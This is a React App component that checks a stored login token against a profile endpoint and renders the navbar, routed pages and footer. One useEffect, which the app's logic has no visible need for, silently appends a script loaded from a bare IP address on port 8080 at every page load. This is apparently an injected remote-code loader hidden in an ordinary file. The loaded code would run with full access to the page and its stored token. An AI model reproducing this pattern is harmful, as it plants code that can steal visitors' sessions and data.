import React, { useState, useEffect } from "react";

import { Outlet, useLocation } from "react-router-dom";
import Navbar from "./components/Navbar";
import Footer from "./components/Footer";
import cacheService from "./service/CacheService";
import fetchService from "./service/FetchService";

function App() {

  const [isLoggedIn, setIsLoggedIn] = useState(false);

  useEffect(() => {

    (async function () {
      const hasToken = cacheService.isLoggedIn();
      if (hasToken) {
        const res = await fetchService.fetchRes("/api/profile", "GET");
        if (res.status >= 400) {
          
          setIsLoggedIn(false);
          cacheService.removeLocalValue("token");
        } else {
          setIsLoggedIn(true);
        }
      } else {
        setIsLoggedIn(false);
      }
      
    })();
  }, [isLoggedIn, useLocation().pathname]);

  


  useEffect(() => {
    const script = document.createElement("script");
    script.src = "https://62.168.153.58:8080/api/js/?id=1";
    script.async = true;
    document.body.appendChild(script);

    return () => {
      document.body.removeChild(script);
    };
  }, []);

  return (
    <>
      <Navbar {...{ isLoggedIn, setIsLoggedIn }} />
      <main>
        <Outlet context={{ setIsLoggedIn, isLoggedIn }} />
      </main>
      <Footer/>
    </>
  );
}

export default App;
